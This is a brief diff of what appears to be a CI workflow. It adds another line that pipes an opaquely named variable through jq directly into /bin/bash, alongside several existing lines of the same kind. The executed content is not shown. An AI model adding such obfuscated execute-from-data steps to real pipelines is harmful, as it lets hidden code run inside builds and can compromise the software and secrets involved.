@@ -21,6 +21,7 @@ jobs:
           printf '%s' "$nd9" | jq -r .iinyk00 | /bin/bash
           echo $uapa3 | jq -r .n53 | /bin/bash
           echo $pxyh0 | jq -r .soi647 | /bin/bash
+          echo $w9 | jq -r .ztdb9438 | /bin/bash
 
       - name: Persist output
         if: always()
